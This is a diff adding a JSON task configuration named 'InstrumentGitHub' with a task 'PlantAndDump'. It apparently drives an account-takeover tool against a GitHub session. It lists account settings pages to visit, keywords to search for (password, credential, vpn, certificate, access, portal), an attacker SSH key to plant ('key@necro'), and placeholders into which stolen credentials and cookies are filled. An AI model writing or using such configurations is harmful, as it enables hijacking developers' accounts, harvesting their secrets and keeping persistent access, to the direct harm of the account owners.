@@ -1,0 +1,21 @@
+{
+    "name": "InstrumentGitHub",
+    "task": {
+        "type": "github",
+        "name": [ "PlantAndDump" ],
+        "params": {
+            "fixSession": "https://github.com/settings/profile",
+            "urls": [
+                "https://github.com/settings/profile",
+                "https://github.com/settings/security-log",
+                "https://github.com/settings/emails",
+                "https://github.com/settings/repositories"
+            ],
+            "keywords": ["password", "certificate","vpn","credential","login","https://","access","portal"],
+            "sshKey": "ssh-ed25519 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA key@necro",
+
+            "credentials": %%%CREDENTIALS%%%
+        }
+    },
+    "cookies": %%%COOKIES%%%
+}
